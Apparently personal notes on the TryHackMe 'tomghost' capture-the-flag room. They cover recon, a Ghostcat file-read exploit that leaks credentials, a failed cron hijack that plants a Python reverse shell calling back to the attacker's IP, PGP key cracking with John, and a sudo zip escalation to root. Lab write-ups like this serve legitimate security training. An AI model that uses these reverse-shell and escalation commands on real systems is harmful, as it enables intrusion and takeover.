https://tryhackme.com/room/tomghost

```
export IP=10.10.120.190; export MYIP=10.4.18.63
```

# nmap
## init
```
PORT     STATE    SERVICE
22/tcp   open     ssh
53/tcp   open     domain
7100/tcp filtered font-service
8009/tcp open     ajp13
8080/tcp open     http-proxy
```
## extended
```
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp    open     tcpwrapped
870/tcp   filtered unknown
2813/tcp  filtered llm-pass
2964/tcp  filtered bullant-srap
4093/tcp  filtered pvxpluscs
8009/tcp  open     ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open     http         Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
10356/tcp filtered unknown
12326/tcp filtered unknown
16795/tcp filtered unknown
21565/tcp filtered unknown
27824/tcp filtered unknown
33895/tcp filtered unknown
43605/tcp filtered unknown
49404/tcp filtered unknown
51656/tcp filtered unknown
55953/tcp filtered unknown
61347/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#tomcat #ajp13 #jserv #apache_jserv

# http
http://10.10.120.190:8080/
```
Apache Tomcat/9.0.30
```

## ffuf
```
$ ffuf -u "http://$IP:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -r
                        
                        [Status: 200, Size: 11196, Words: 4210, Lines: 200, Duration: 633ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 280ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 275ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 276ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 272ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 278ms]
```

# metasploit
- `msf6 auxiliary(admin/http/tomcat_ghostcat)`

```
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

## credentials
```
skyfuck:8730281lkjlkjdqlksalks
```

# user:skyfuck
```
$ history
    1  ls
    2  cd ..
    3  ls
    4  cd skyfuck/
    5  ls
    6  exit
    7  cd ..
    8  ls
    9  cd skyfuck/
   10  ls
   11  wget 192.168.32.23/tryhackme.asc
   12  wget 192.168.32.23/credential.pgp
   13  ls
   14  exot
   15  exit


$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.

$ find / -type f -perm -04000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/bin/su
/bin/ping6

$ id 
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
skyfuck@ubuntu:~$ groups
skyfuck
skyfuck@ubuntu:~$ hostname
ubuntu
skyfuck@ubuntu:~$ uname -a
Linux ubuntu 4.4.0-174-generic #204-Ubuntu SMP Wed Jan 29 06:41:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

```

# Attack
## Attack vector (failed)
```
skyfuck@ubuntu:~$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /root/ufw && bash ufw.sh

$ echo $PATH
/home/skyfuck/bin:/home/skyfuck/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

## Attack (failed)
Victim machine:
```
skyfuck@ubuntu:~$ echo 
'python -c ''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.18.63",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' > /home/skyfuck/bin/ufw.sh

skyfuck@ubuntu:~$ chmod +x /home/skyfuck/bin/ufw.sh
```
Attacker machine:
```
$ nc -nlvp 7777

```

## Attack vector 2
#john_the_ripper #john #asc_file #asc 
```
gpg2john -d tryhackme.asc > hash_out
john hash_out

# password:alexandru
```

#pgp #decrypt 
```
$ gpg --import tryhackme.asc                                  
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

 ####### enter the passwod 'alexandru'
```

### Credential
#gpg #drcrypt
```
$ gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

## ssh merlin user
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

### zip
#zip #sudo #gtfobins #sudo_intended_functionality #intended_functionality 
```
TF=$(mktemp -u); sudo zip $TF /etc/hostname -T -TT "/bin/sh #"; sudo rm $TF
```
